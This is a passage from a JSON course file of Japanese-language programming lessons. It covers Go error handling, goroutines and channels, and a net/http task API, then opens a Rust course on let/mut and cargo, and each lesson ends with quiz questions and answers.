{\n\tprices := map[string]int{\"りんご\": 120}\n\tp, ok := prices[name]\n\tif !ok {\n\t\treturn 0, ErrNotFound\n\t}\n\treturn p, nil\n}\n\np, err := findPrice(\"ぶどう\")\nif err != nil {\n\tfmt.Println(\"エラー:\", err, p)    // エラー: 商品が見つかりません 0\n}\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `errors.New(\"...\")` | 新しいエラーを作る（Python の `raise ValueError(\"...\")` の中身） |\n| `var ErrNotFound = ...` | よく使うエラーに名前を付けておく（**センチネルエラー**）。`Err` で始める習慣 |\n| `return 0, ErrNotFound` | 失敗：ゼロ値とエラー |\n| `return p, nil` | 成功：値と nil |\n\n## 種類を見分ける：errors.Is\n\n```go\nif errors.Is(err, ErrNotFound) {\n\tfmt.Println(\"→ 404 を返す\")     // → 404 を返す\n}\n```\n\n`errors.Is(err, 種類)` は「err は、この種類のエラーか？」を調べます。Python の `except NotFoundError:` で種類ごとに分けるのに当たります。Web API なら「見つからない → 404、それ以外 → 500」のように分けるのに使います。\n\n## 包む：fmt.Errorf と %w\n\n```go\nfunc loadConfig(path string) (string, error) {\n\tdata, err := os.ReadFile(path)\n\tif err != nil {\n\t\treturn \"\", fmt.Errorf(\"設定を読めません（%s）: %w\", path, err)\n\t}\n\treturn string(data), nil\n}\n\n_, err = loadConfig(\"config.toml\")\nfmt.Println(err)\n// 設定を読めません（config.toml）: open config.toml: no such file or directory\nfmt.Println(errors.Is(err, os.ErrNotExist))\n// true\n```\n\n`fmt.Errorf` で、**元のエラーに「何をしようとして失敗したか」を足して** 返しています。表示すると、外側から内側へ `:` でつながって読めます。\n\n`%w`（wrap）で包むと、元のエラー（ファイルが無い `os.ErrNotExist`）が中に残るので、`errors.Is` で **包んだ後でも種類を見分けられます**。`%v` で包むと、ただの文字になってしまい、`errors.Is` が false になります。\n\nPython の `raise ConfigError(\"...\") from e` に当たります。\n\n## defer：関数を抜けるときに実行\n\n```go\nf, err := os.Create(\"out.txt\")\nif err != nil {\n\tpanic(err)\n}\ndefer f.Close()                               // 関数を抜けるときに閉じる\ndefer fmt.Println(\"defer 1（後に登録したものが先）\")\ndefer fmt.Println(\"defer 2\")\nfmt.Fprintln(f, \"hello\")\nfmt.Println(\"main の終わり\")\n```\n\n```text\nmain の終わり\ndefer 2\ndefer 1（後に登録したものが先）\n```\n\n`defer` を付けた処理は、**その関数が終わるときに** 実行されます。途中で `return` しても実行されるので、ファイルを閉じる・ロックを外す（レッスン 5）などの **後片付け** に使います。シェルコースの `trap ... EXIT`、Python の `with open(...)` や `finally` に当たります。複数あると、**後に書いたものから** 実行されます。\n\n## panic：本当に続けられないとき\n\n```go\npanic(err)\n```\n\n`panic` は、プログラムを **止めて** しまいます（Python の、受け止められなかった例外のようなもの）。nil のポインタを読んだとき（レッスン 3）、スライスの範囲外を読んだとき（`items[10]`）も panic になります。\n\n| | `return err` | `panic(err)` |\n|---|---|---|\n| 使う場面 | **ふつうの失敗**（ファイルが無い、入力がおかしい） | 起きるはずのないこと、起動時の致命的な設定ミス |\n| 呼んだ側 | `if err != nil` で対応できる | 止まる（`recover` で受け止める特殊な方法はある） |\n\nWeb サーバーのリクエストの処理の中で panic を使うのは避けます。\n\n## ⚠️ err を捨てる\n\n```go\ndata, _ := os.ReadFile(\"config.toml\")      // ⚠️ 失敗しても気づけない\n```\n\n`_` で err を受け取ると、**失敗を黙って無視** することになります。data は空のまま、何事も無かったように先へ進みます。シェルコースの「`set -e` が無いスクリプト」と同じ危険です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `if err != nil { return nil, err }` | 失敗をそのまま呼んだ人に返す（定番） |\n| `if err != nil { return fmt.Errorf(\"ユーザー取得: %w\", err) }` | ✅ 何をしていたかを足して返す |\n| `x, _ := ...` | ⚠️ エラーを捨てている。本当に失敗しない？ |\n| `if err != nil { log.Println(err) }` だけで先に進む | ⚠️ ログに出すだけで処理を続けている。続けて大丈夫か |\n| `errors.Is(err, sql.ErrNoRows)` | データベースで行が見つからなかった（→ 404 にすることが多い） |\n| `log.Fatal(err)` | ログに出して **プログラムを終了**。main の起動時以外で使っていたら要注意 |\n| `defer rows.Close()` / `defer mu.Unlock()` | 後片付け。付け忘れると、接続やロックが残り続ける |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Go の関数 `func Load() (Config, error)` が成功したとき、2 つ目の戻り値は？",
        "choices": [
         "nil",
         "true",
         "空の文字列"
        ],
        "answer": 0,
        "explain": "成功したときの error は nil です。呼んだ側は `if err != nil` で失敗かどうかを確かめます。"
       },
       {
        "question": "`fmt.Errorf(\"設定を読めません: %w\", err)` で `%w` を使う利点は？",
        "choices": [
         "エラーメッセージが短くなる",
         "元のエラーが中に残り、包んだ後でも `errors.Is` で種類を見分けられる",
         "エラーが自動で直る"
        ],
        "answer": 1,
        "explain": "`%w` で包むと元のエラーをたどれます。`%v` だと文字になってしまい、種類を見分けられません。"
       },
       {
        "question": "`defer f.Close()` はいつ実行される？",
        "choices": [
         "すぐに",
         "プログラム全体が終わるときに",
         "その関数が終わるとき（途中で return しても）"
        ],
        "answer": 2,
        "explain": "defer はその関数を抜けるときに実行されます。後片付けを書き忘れないための仕組みです。"
       }
      ]
     ],
     "id": "04-errors"
    },
    {
     "title": "goroutine と channel ― 同時に動かす",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "async",
      "performance",
      "hardware"
     ],
     "summary": "go を付けるだけで同時に動く goroutine、終わるのを待つ WaitGroup、値を受け渡す channel、そしてロック（Mutex）を忘れると数がずれるデータ競合を実際に起こし、-race で見つける。",
     "body": "## このレッスンのゴール\n\n- `go 関数()` で goroutine を起動し、`sync.WaitGroup` で待つコードを読める\n- channel（`<-`）で値を受け渡すコードを読める\n- データ競合（レースコンディション）を説明でき、`sync.Mutex` と `-race` の役割が分かる\n\nコンピュータの基礎コースの「プロセスとスレッド」の続きです。Go は、**同時に動く処理（並行処理）を書きやすい** ことで人気になった言語です。\n\n## goroutine：go を付けると同時に動く\n\n1 回 0.5 秒かかる処理（通信の代わり）を 3 回します。\n\n```go\nfunc fetch(id int) string {\n\ttime.Sleep(500 * time.Millisecond)\n\treturn fmt.Sprintf(\"結果%d\", id)\n}\n\n// 順番に\nfor i := 1; i <= 3; i++ {\n\tfetch(i)\n}\n// 順番に: 1.5 秒\n\n// goroutine で\nvar wg sync.WaitGroup\nfor i := 1; i <= 3; i++ {\n\twg.Add(1)\n\tgo func(id int) {\n\t\tdefer wg.Done()\n\t\tfetch(id)\n\t}(i)\n}\nwg.Wait()\n// goroutine で: 0.5 秒\n```\n\n（実際に測った時間です）\n\n| 部分 | 意味 |\n|---|---|\n| `go 関数(...)` | **goroutine**（ゴルーチン）として起動。終わるのを待たずに、すぐ次の行へ進む |\n| `func(id int) { ... }(i)` | その場で作った名前の無い関数を、`i` を渡してすぐ呼ぶ |\n| `var wg sync.WaitGroup` | 「いくつ終わるのを待つか」を数える道具 |\n| `wg.Add(1)` | 待つ数を 1 増やす |\n| `defer wg.Done()` | 終わったら 1 減らす（レッスン 4 の defer） |\n| `wg.Wait()` | 0 になるまで待つ |\n\ngoroutine は、スレッドよりずっと **軽い**（何万個も作れる）のが特徴です。Python で言うと、`ThreadPoolExecutor` や `asyncio.gather` を使った並行処理（Python コースのレッスン 13）を、`go` の 2 文字で書ける感覚です。\n\n⚠️ `wg.Wait()` を忘れると、main が先に終わって、**goroutine の仕事が途中で打ち切られます**。\n\n## channel：goroutine どうしで値を受け渡す\n\n```go\nresults := make(chan string)          // string を流す channel を作る\n\nfor i := 1; i <= 3; i++ {\n\tgo func(id int) {\n\t\tresults <- fetch(id)          // channel に送る\n\t}(i)\n}\n\ngot := []string{}\nfor i := 0; i < 3; i++ {\n\tgot = append(got, <-results)      // channel から受け取る（来るまで待つ）\n}\nfmt.Println(len(got), \"件受け取った\")   // 3 件受け取った\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `make(chan string)` | string を流す **channel**（管）を作る |\n| `ch <- 値` | channel に **送る** |\n| `<-ch` | channel から **受け取る**。まだ来ていなければ、来るまで待つ |\n| `close(ch)` | もう送らない、という合図。`for v := range ch` はそこで終わる |\n\nchannel は、**goroutine どうしの受け渡し口** です。受け取る側が「来るまで待つ」ので、WaitGroup が無くても、3 つ受け取った時点で全部終わったと分かります。Python の `queue.Queue` に近いものです。\n\nGo には「**メモリを共有して通信するのではなく、通信してメモリを共有せよ**」という有名な言葉があります。結果は共有の変数に書き込むのではなく、channel で渡そう、という意味です。\n\n## データ競合：同じ変数を同時に書き換える\n\n1000 個の goroutine で、共有の変数に 1 ずつ足しました。\n\n```go\ncounter := 0\nvar wg sync.WaitGroup\nfor i := 0; i < 1000; i++ {\n\twg.Add(1)\n\tgo func() {\n\t\tdefer wg.Done()\n\t\tcounter++\n\t}()\n}\nwg.Wait()\nfmt.Println(\"ロックなし:\", counter)\n// ロックなし: 990   ← 1000 にならない（実行するたびに変わる。874 のときもあった）\n```\n\nコンピュータの基礎コースで、Python のスレッドで見たのと同じ **データ競合（レースコンディション）** です。`counter++` は「読む → 1 足す → 書く」の 3 段階なので、2 つの goroutine が同時に同じ値を読むと、1 回分が消えます。\n\n### Mutex（ロック）で 1 つずつにする\n\n```go\nvar mu sync.Mutex\ngo func() {\n\tdefer wg.Done()\n\tmu.Lock()           // 鍵をかける（他の goroutine はここで待つ）\n\tcounter++\n\tmu.Unlock()         // 鍵を外す\n}()\n// ロックあり: 1000\n```\n\n`mu.Lock()` から `mu.Unlock()` までは、**同時に 1 つの goroutine しか入れません**。Python の `with lock:` です。Unlock を忘れないように、`mu.Lock(); defer mu.Unlock()` と書くことも多いです（レッスン 6 の Web API がこの形）。\n\n## -race：データ競合を見つける\n\n```bash\ngo run -race .\n```\n\n```text\nWARNING: DATA RACE\n...\nロックなし: 874\nロックあり: 1000\nFound 2 data race(s)\n```\n\n`-race` を付けて実行すると、Go が **データ競合が起きた場所を教えてくれます**（どの行とどの行が、同じ変数を同時にさわったか）。ロックありの方は何も言われませんでした。テストも `go test -race ./...` で実行するのが定番です。\n\nデータ競合は **たまにしか起きず、テストで見つけにくい** バグです。goroutine を使う AI のコードは、`-race` で一度実行してみましょう。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方・チェック |\n|---|---|\n| `go func() { ... }()` | goroutine を起動。誰が終わりを待っている？（WaitGroup・channel） |\n| goroutine の中で、外の変数・マップ・スライスに書き込んでいる | ⚠️ ロック（`sync.Mutex`）か channel が必要。`-race` で確認 |\n| `for _, v := range items { go func() { use(v) }() }` | Go 1.22 以降は v が毎回別なので OK。古い Go では全部同じ v になるバグがあった（`go func(v T){...}(v)` と渡すのはその名残） |\n| `ctx context.Context` が引数の先頭 | 処理の「取り消し」や「時間切れ」を伝える仕組み。Web のリクエストが切れたら、関係する処理も止める |\n| `select { case v := <-ch: ... case <-time.After(3 * time.Second): ... }` | どれか先に来た channel を処理する。この例は 3 秒の時間切れ |\n| `errgroup.Group` | 複数の goroutine を起動して、どれかが失敗したらまとめてエラーを返す便利な道具 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`go fetch(1)` と書いた直後の行は、いつ実行される？",
        "choices": [
         "fetch(1) が終わってから",
         "fetch(1) の終わりを待たずに、すぐ",
         "プログラムが終わるとき"
        ],
        "answer": 1,
        "explain": "go を付けると goroutine として起動し、すぐ次の行へ進みます。終わりを待つには WaitGroup や channel を使います。"
       },
       {
        "question": "1000 個の goroutine で `counter++` したら 990 になった。原因と直し方は？",
        "choices": [
         "goroutine の数が多すぎる。100 個にする",
         "同じ変数を同時に「読む → 足す → 書く」して更新が消えた（データ競合）。Mutex でロックするか channel で集める",
         "counter の型が小さすぎる。int64 にする"
        ],
        "answer": 1,
        "explain": "複数の goroutine が共有の変数を書き換えるときは、ロックで 1 つずつにします。`go run -race` で見つけられます。"
       },
       {
        "question": "`result := <-ch` の動きとして正しいのは？",
        "choices": [
         "channel から値を受け取る。まだ値が来ていなければ、来るまで待つ",
         "channel に値を送る",
         "channel を閉じる"
        ],
        "answer": 0,
        "explain": "`<-ch` は受け取り、`ch <- v` は送りです。受け取りは値が来るまで待ちます。"
       }
      ]
     ],
     "id": "05-goroutines"
    },
    {
     "title": "Go の Web API を読む ― net/http と JSON",
     "level": 3,
     "minutes": 20,
     "concepts": [
      "http_api",
      "backend",
      "data_formats",
      "reading"
     ],
     "summary": "標準ライブラリだけで書いたタスク管理の API を 1 行ずつ読む。構造体のタグで JSON にする、ハンドラーの (w, r)、GET /tasks/{id} のルーティング、エラーで 400・404 を返す、Mutex で守る。実際に curl で叩いた結果つき。",
     "body": "## このレッスンのゴール\n\n- `http.HandleFunc` とハンドラー `func(w http.ResponseWriter, r *http.Request)` を読める\n- 構造体のタグ（`` `json:\"id\"` ``）と、JSON の読み書きが分かる\n- このコースで学んだこと（エラー・ポインタ・Mutex）が、実際の API でどう使われているか説明できる\n\nバックエンドコースで FastAPI（Python）で作ったような API を、Go の **標準ライブラリだけ** で書いたものです。\n\n## 全体\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"log\"\n\t\"net/http\"\n\t\"strconv\"\n\t\"sync\"\n)\n\ntype Task struct {\n\tID    int    `json:\"id\"`\n\tTitle string `json:\"title\"`\n\tDone  bool   `json:\"done\"`\n}\n\ntype store struct {\n\tmu     sync.Mutex\n\ttasks  []Task\n\tnextID int\n}\n\nfunc (s *store) list(w http.ResponseWriter, r *http.Request) {\n\ts.mu.Lock()\n\tdefer s.mu.Unlock()\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tjson.NewEncoder(w).Encode(s.tasks)\n}\n\nfunc (s *store) create(w http.ResponseWriter, r *http.Request) {\n\tvar in struct {\n\t\tTitle string `json:\"title\"`\n\t}\n\tif err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Title == \"\" {\n\t\thttp.Error(w, \"title は必須です\", http.StatusBadRequest)\n\t\treturn\n\t}\n\ts.mu.Lock()\n\tdefer s.mu.Unlock()\n\ts.nextID++\n\tt := Task{ID: s.nextID, Title: in.Title}\n\ts.tasks = append(s.tasks, t)\n\tw.Header().Set(\"Content-Type\", \"application/json\")\n\tw.WriteHeader(http.StatusCreated)\n\tjson.NewEncoder(w).Encode(t)\n}\n\nfunc (s *store) get(w http.ResponseWriter, r *http.Request) {\n\tid, err := strconv.Atoi(r.PathValue(\"id\"))\n\tif err != nil {\n\t\thttp.Error(w, \"id は数字です\", http.StatusBadRequest)\n\t\treturn\n\t}\n\ts.mu.Lock()\n\tdefer s.mu.Unlock()\n\tfor _, t := range s.tasks {\n\t\tif t.ID == id {\n\t\t\tjson.NewEncoder(w).Encode(t)\n\t\t\treturn\n\t\t}\n\t}\n\thttp.Error(w, \"見つかりません\", http.StatusNotFound)\n}\n\nfunc main() {\n\ts := &store{tasks: []Task{}}\n\thttp.HandleFunc(\"GET /tasks\", s.list)\n\thttp.HandleFunc(\"POST /tasks\", s.create)\n\thttp.HandleFunc(\"GET /tasks/{id}\", s.get)\n\tlog.Println(\"http://localhost:8080 で待っています\")\n\tlog.Fatal(http.ListenAndServe(\":8080\", nil))\n}\n```\n\n## 実際に叩いてみる\n\n```text\n$ curl localhost:8080/tasks\n[]\n$ curl -X POST localhost:8080/tasks -d '{\"title\":\"牛乳を買う\"}'\n{\"id\":1,\"title\":\"牛乳を買う\",\"done\":false}               201\n$ curl -X POST localhost:8080/tasks -d '{}'\ntitle は必須です                                         400\n$ curl localhost:8080/tasks/1\n{\"id\":1,\"title\":\"牛乳を買う\",\"done\":false}               200\n$ curl localhost:8080/tasks/9\n見つかりません                                           404\n$ curl localhost:8080/tasks/abc\nid は数字です                                            400\n$ curl -X DELETE localhost:8080/tasks/1\nMethod Not Allowed                                       405\n```\n\n（右の数字はステータスコード。バックエンドコースの「HTTP」）\n\n## 上から読む\n\n### データの形：構造体とタグ\n\n```go\ntype Task struct {\n\tID    int    `json:\"id\"`\n\tTitle string `json:\"title\"`\n\tDone  bool   `json:\"done\"`\n}\n```\n\n`` `json:\"id\"` `` は **構造体のタグ** で、「JSON にするときは `id` という名前にして」という指定です。Go の項目名は外から使うため大文字（レッスン 1）ですが、JSON では小文字の `id` にしたい、という食い違いをこれで埋めています。\n\nFastAPI の Pydantic のモデル（`class Task(BaseModel): id: int ...`）に当たります。\n\n### 状態：store と Mutex\n\n```go\ntype store struct {\n\tmu     sync.Mutex\n\ttasks  []Task\n\tnextID int\n}\n```\n\nタスクの一覧をメモリに持っています（再起動すると消える。本物はデータベースへ）。`mu` があるのは、Go の HTTP サーバーが **リクエストごとに goroutine を起動して、同時に処理する** からです。2 つの POST が同時に来ても `nextID` や `tasks` が壊れないよう、レッスン 5 の Mutex で守っています。\n\n### ハンドラー：(w, r)\n\n```go\nfunc (s *store) list(w http.ResponseWriter, r *http.Request) {\n```\n\n| 引数 | 意味 |\n|---|---|\n| `w http.ResponseWriter` | **返事を書き込む先**。ヘッダー・ステータスコード・本文を書く |\n| `r *http.Request` | **届いたリクエスト**。メソッド・URL・ヘッダー・本文 |\n\nGo の Web のコードは、ほぼすべてこの `(w, r)` の形です。FastAPI の「関数の引数で受け取り、`return` で返す」と違い、**返事は w に書き込んで** 返します。\n\n`(s *store)` と `*` 付きのメソッドなのは、`create` で中身（tasks）を変えるからです（レッスン 3）。\n\n### JSON を返す・受け取る\n\n```go\njson.NewEncoder(w).Encode(s.tasks)              // s.tasks を JSON にして w に書く\n\nvar in struct { Title string `json:\"title\"` }\njson.NewDecoder(r.Body).Decode(&in)             // リクエストの本文の JSON を in に読む\n```\n\n`&in` の `&` は「in の場所（ポインタ）」で、Decode が in の中身を書き換えられるように渡しています。\n\n受け取る側を **Title だけの構造体** にしているのがポイントです。`{\"title\": \"...\", \"id\": 999, \"done\": true}` を送られても、`id` や `done` は無視されます。セキュリティのコースの **マスアサインメント** の対策になっています。\n\n### エラーで止める\n\n```go\nif err := json.NewDecoder(r.Body).Decode(&in); err != nil || in.Title == \"\" {\n\thttp.Error(w, \"title は必須です\", http.StatusBadRequest)\n\treturn\n}\n```\n\nレッスン 2 の「`if 準備の文; 条件`」と、レッスン 4 の `if err != nil` の組み合わせです。JSON が壊れているか、title が空なら、**400 を返して `return`**。この `return` を忘れると、エラーを返した後も処理が続いてしまうので要注意です。\n\n### ルーティング\n\n```go\nhttp.HandleFunc(\"GET /tasks\", s.list)\nhttp.HandleFunc(\"POST /tasks\", s.create)\nhttp.HandleFunc(\"GET /tasks/{id}\", s.get)\n```\n\n「GET で /tasks に来たら s.list」のように、**メソッドとパス** で振り分けています（Go 1.22 から標準ライブラリだけで書けるようになりました）。`{id}` の部分は `r.PathValue(\"id\")` で取り出せます。登録していない DELETE には、Go が自動で **405 Method Not Allowed** を返しました。\n\nFastAPI の `@app.get(\"/tasks/{id}\")` と同じ考え方です。古い Go のコードや、Gin・Echo・chi などのライブラリでは `r.GET(\"/tasks/:id\", ...)` のような書き方もよく見ます。\n\n### 起動\n\n```go\nlog.Fatal(http.ListenAndServe(\":8080\", nil))\n```\n\n8080 番のポートでリクエストを待ち続けます。起動に失敗したら（ポートが使用中など。コンピュータの基礎コースのレッスン 6）、`log.Fatal` でエラーを出して終了します。\n\n## FastAPI と並べると\n\n| | Go（net/http） | Python（FastAPI） |\n|---|---|---|\n| データの形 | 構造体 ＋ `json` タグ | Pydantic のモデル |\n| ルーティング | `http.HandleFunc(\"GET /tasks/{id}\", h)` | `@app.get(\"/tasks/{id}\")` |\n| パスの値 | `r.PathValue(\"id\")` → 自分で `strconv.Atoi` | 引数 `id: int`（自動で変換・チェック） |\n| 返事 | `w` に書き込む | `return` する |\n| エラー | `http.Error(w, \"...\", 404); return` | `raise HTTPException(404)` |\n| 同時のリクエスト | goroutine で並行に処理（Mutex が必要なことも） | async / スレッド |\n\nGo は **自分で書く部分が多い** 代わりに、**何が起きているかが全部コードに書いてある** のが特徴です。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | チェック |\n|---|---|\n| `http.Error(...)` の後に `return` が無い | ⚠️ エラーを返した後も処理が続く |\n| ハンドラーの中で、構造体のマップやスライスを書き換えているのに Mutex が無い | ⚠️ 同時のリクエストでデータ競合（`go run -race` で確認） |\n| `json.NewDecoder(r.Body).Decode(&user)` で、データベースのモデルに直接読み込んでいる | ⚠️ マスアサインメント。入力用の構造体を分ける |\n| `` `json:\"password\"` `` | ⚠️ JSON で返すときにパスワードも出てしまう。`` `json:\"-\"` `` で出さない |\n| `defer r.Body.Close()` | 本文を閉じる。サーバー側では Go が自動で閉じるが、HTTP クライアント側では必須 |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Go のハンドラー `func(w http.ResponseWriter, r *http.Request)` で、返事を返すには？",
        "choices": [
         "`return` で値を返す",
         "`w` にヘッダーや本文を書き込む",
         "`r` に書き込む"
        ],
        "answer": 1,
        "explain": "Go の HTTP のハンドラーは、返事を w（ResponseWriter）に書き込みます。r は届いたリクエストです。"
       },
       {
        "question": "構造体の項目に付いた `` `json:\"title\"` `` の意味は？",
        "choices": [
         "JSON にしたり読んだりするとき、この項目の名前を `title` にする",
         "この項目を JSON に含めない",
         "title という型にする"
        ],
        "answer": 0,
        "explain": "Go の項目名は大文字ですが、JSON では小文字にしたいので、タグで名前を指定します。`` `json:\"-\"` `` なら JSON に含めません。"
       },
       {
        "question": "この API の store に `sync.Mutex` がある理由は？",
        "choices": [
         "JSON に変換するため",
         "Go の HTTP サーバーはリクエストを goroutine で同時に処理するので、共有のデータが同時に書き換えられないように守るため",
         "ポート番号を守るため"
        ],
        "answer": 1,
        "explain": "2 つのリクエストが同時に来ると、tasks や nextID のデータ競合が起きます（レッスン 5）。"
       }
      ]
     ],
     "id": "06-web-api"
    }
   ],
   "status": "open"
  },
  {
   "title": "Rust",
   "icon": "🦀",
   "order": 80,
   "description": "安全さと速さを両立する言語。let と mut、所有権と借用（Rust だけの考え方）、構造体と enum と match、Option と Result と ? 演算子、トレイトとジェネリクス、イテレータ。コンパイラのエラーメッセージを読みながら進む。すべて Rust 1.97 で実行・コンパイルしたもの。",
   "levels": {
    "1": "入門：変数と所有権",
    "2": "基礎：型で表す",
    "3": "実践：抽象化と AI のコード"
   },
   "id": "80-rust",
   "lessons": [
    {
     "title": "let と mut ― Rust の第一歩",
     "level": 1,
     "minutes": 15,
     "concepts": [
      "variables",
      "types",
      "basics",
      "tooling"
     ],
     "summary": "fn main と println!、変数は最初から変えられない（mut を付けると変えられる）、型と as による変換、シャドーイング。cargo の使い方と、Rust のコンパイラのエラーメッセージの読み方。",
     "body": "## このレッスンのゴール\n\n- `fn main()`・`println!`・`format!` を読める\n- `let` と `let mut` の違いを説明できる\n- Rust のコンパイラのエラーメッセージ（`error[E....]` と `help:`）の読み方が分かる\n\n## Rust とは\n\n**Rust**（ラスト）は、**C や C++ と同じくらい速く、それでいてメモリの使い方の間違いをコンパイラが防いでくれる** 言語です。ブラウザの部品、OS の一部、コマンドラインのツール（`ripgrep`・Python の `uv` や `ruff` なども Rust 製）、Cloudflare Workers の内部などで使われています。\n\n速さと安全さのために、**所有権**（レッスン 2）という独特の考え方があり、最初はコンパイラによく怒られます。でも、その **エラーメッセージがとても親切** なのも Rust の特徴です。\n\n## 最初のプログラム\n\n```rust\nfn greet(name: &str) -> String {\n    format!(\"こんにちは、{name} さん\")\n}\n\nfn main() {\n    let price = 120;\n    let mut count = 1;\n    count += 2;\n    let total = price * count;\n    println!(\"{}\", greet(\"Ryo\"));\n    println!(\"合計 {total} 円（{count} 個）\");\n}\n```\n\n```text\nこんにちは、Ryo さん\n合計 360 円（3 個）\n```\n\n（このコースの出力とエラーは、すべて Rust 1.97 で実際にコンパイル・実行したものです）\n\n| Rust | 意味 | Python で言うと |\n|---|---|---|\n| `fn main()` | プログラムの入口 | `if __name__ == \"__main__\":` |\n| `fn greet(name: &str) -> String` | 関数。`&str` は文字列を借りる（レッスン 2）、`String` を返す | `def greet(name: str) -> str:` |\n| `format!(\"...{name}...\")` | 文字列を作る | `f\"...{name}...\"` |\n| `println!(\"{}\", x)` | 表示して改行 | `print(x)` |\n| 最後の行に `;` が無い | **それが関数の戻り値** になる（`return` を省略できる） | `return ...` |\n\n`println!` や `format!` の **`!`** は、関数ではなく **マクロ**（コンパイルするときに別のコードに展開されるもの）という印です。読むときは「特別な関数」と思って大丈夫です。\n\n## let と mut：変数は最初は変えられない\n\n```rust\nfn main() {\n    let count = 1;\n    count += 2;\n    println!(\"{count}\");\n}\n```\n\n```text\nerror[E0384]: cannot assign twice to immutable variable `count`\n --> r1b.rs:3:5\n  |\n2 |     let count = 1;\n  |         ----- first assignment to `count`\n3 |     count += 2;\n  |     ^^^^^^^^^^ cannot assign twice to immutable variable\n  |\nhelp: consider making this binding mutable\n  |\n2 |     let mut count = 1;\n  |         +++\n```\n\nRust の変数は、**最初から変えられない（イミュータブル）** のが決まりです。変えたい変数には **`mut`**（mutable：変えられる）を付けます。\n\n### エラーメッセージの読み方\n\n| 部分 | 意味 |\n|---|---|\n| `error[E0384]` | エラーの番号。`rustc --explain E0384` でくわしい説明が出る |\n| `cannot assign twice to immutable variable` | 変えられない変数に、2 回入れようとした |\n| `--> r1b.rs:3:5` | ファイル名・行・列 |\n| `-----` と `^^^^` | 関係する場所に線を引いて、それぞれ説明している |\n| `help:` | **直し方の提案**。`+++` の部分を足せば直る |\n\n**`help:` を読めば、多くの場合そのまま直せます**。AI が書いた Rust のコードがコンパイルできないときも、まずエラーメッセージの `help:` を見ましょう。\n\nPython では変数は何度でも入れ直せましたが、Rust は「変わる変数」に印を付けることで、**どこで値が変わるのかを、コードを読む人にも分かるように** しています。\n\n## 型\n\n```rust\nlet price = 120;                    // i32（整数）と推論される\nlet rate: f64 = 0.1;                // 型を書くなら 名前: 型\nlet total = 360;\nlet with_tax = total as f64 * (1.0 + rate);\nprintln!(\"{with_tax}\");             // 396.00000000000006\n```\n\n| 型 | 中身 | Python で言うと |\n|---|---|---|\n| `i32` / `i64` | 符号付き整数（32・64 ビット） | `int` |\n| `u32` / `u64` / `usize` | **0 以上** の整数（`usize` は長さや番号に使う） | `int` |\n| `f64` | 小数 | `float` |\n| `bool` | `true` / `false` | `bool` |\n| `char` | 1 文字 | — |\n| `&str` / `String` | 文字列（借りたもの／持っているもの。レッスン 2） | `str` |\n| `Vec<T>` | 伸び縮みする配列 | `list` |\n\nGo と同じく、**整数と小数を混ぜて計算できない** ので、`as f64` で変換しています。そして、`396.00000000000006` はコンピュータの基礎コースの「小数の誤差」です。\n\n### シャドーイング\n\n```rust\nlet x = 5;\nlet x = x * 2;       // 新しい x を作り直す\nprintln!(\"shadow {x}\");   // shadow 10\n```\n\n`let` をもう一度書くと、**同じ名前の新しい変数** を作れます（シャドーイング）。`mut` とは違い、型を変えることもできます（`let input = input.trim();` のように）。\n\n## 表示の書き方\n\n```rust\nlet fruits = vec![\"りんご\", \"バナナ\"];\nprintln!(\"{:?} {}\", fruits, fruits.len());   // [\"りんご\", \"バナナ\"] 2\n```\n\n| 書き方 | 意味 |\n|---|---|\n| `{}` | 人向けの表示（Display） |\n| `{:?}` | 開発者向けの表示（Debug）。リストや構造体の中身を見るとき |\n| `{name}` | 変数をその場に |\n| `{:.2}` | 小数点以下 2 桁 |\n\n`{:?}` は Python の `repr()` に近いです。\n\n## cargo：Rust の道具箱\n\n```bash\ncargo new myapp      # プロジェクトを作る（Cargo.toml と src/main.rs ができる）\ncargo run            # コンパイルして実行\ncargo build --release   # 速い実行ファイルを作る（--release で最適化）\ncargo test           # テスト\ncargo add serde      # ライブラリ（クレート）を追加\ncargo clippy         # よくない書き方を指摘してくれる\n```\n\n| ファイル | 意味 | 似ているもの |\n|---|---|---|\n| `Cargo.toml` | プロジェクトの名前と使うライブラリ | `pyproject.toml` / `package.json` |\n| `Cargo.lock` | 実際に使うバージョン（ロックファイル） | `uv.lock` / `package-lock.json` |\n| `src/main.rs` | 実行するプログラムの入口 | |\n| `src/lib.rs` | ライブラリの入口 | |\n\nRust のライブラリは **クレート**（crate）と呼ばれ、crates.io で公開されています。\n\n## AI のコードではこう出てくる\n\n| 見かけたら | 読み方 |\n|---|---|\n| `let mut v = Vec::new();` | 後で中身を変える空の Vec |\n| `let x: u32 = s.parse().unwrap();` | 文字列を数に変換（unwrap はレッスン 3・4） |\n| `fn main() -> Result<(), Box<dyn Error>>` | main もエラーを返せる形（レッスン 4） |\n| `#[derive(Debug)]` | `{:?}` で表示できるようにする印（レッスン 3） |\n| `n as f64` / `len as u32` | 型の変換。大きい型から小さい型への `as` は、はみ出した分が切られるので注意 |\n| `cargo build --release` | 本番用の速い実行ファイル。`target/release/` にできる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "Rust で `let count = 1;` の後に `count += 2;` と書くと？",
        "choices": [
         "count が 3 になる",
         "コンパイルエラー（変えられない変数に入れ直そうとした）",
         "警告が出るが count は 3 になる"
        ],
        "answer": 1,
        "explain": "Rust の変数は最初は変えられません。変えたいなら `let mut count = 1;` と mut を付けます。エラーの help: もそう提案していました。"
       },
       {
        "question": "`println!` の `!` は何を表す？",
        "choices": [
         "関数ではなく、マクロであること",
         "強調して表示すること",
         "エラーが起きたら止まること"
        ],
        "answer": 0,
        "explain": "`!` が付くのはマクロです。println!・format!・vec! などがよく出てきます。"
       },
       {
        "question": "Rust のコンパイルエラーが出たとき、まず見るとよいところは？",
        "choices": [
         "エラーの番号だけ",
         "どの行かを示す `-->` と、直し方を提案する `help:`",
         "最後の行の `aborting due to ...`"
        ],
